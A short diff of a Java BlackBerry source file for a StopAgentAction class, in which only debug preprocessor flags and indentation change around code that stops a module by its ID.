@@ -21,7 +21,7 @@ import blackberry.event.Event;
  * The Class StopAgentAction.
  */
 public final class StopAgentAction extends SubAction {
-  //#ifdef DEBUG
+    //#ifdef DEBUG
     static Debug debug = new Debug("StopAgentAction", DebugLevel.VERBOSE);
     //#endif
     int agentId;
@@ -44,13 +44,13 @@ public final class StopAgentAction extends SubAction {
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
     public boolean execute(final Event triggeringEvent) {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("Stopping " + agentId);
         //#endif
         final AgentManager agentManager = AgentManager.getInstance();
 
         final boolean ret = agentManager.stop(agentId);
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Stopped " + agentId);
         //#endif
         // disable?
@@ -67,7 +67,7 @@ public final class StopAgentAction extends SubAction {
 
         try {
             agentId = databuffer.readInt();
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("agentId: " + agentId);
             //#endif
 
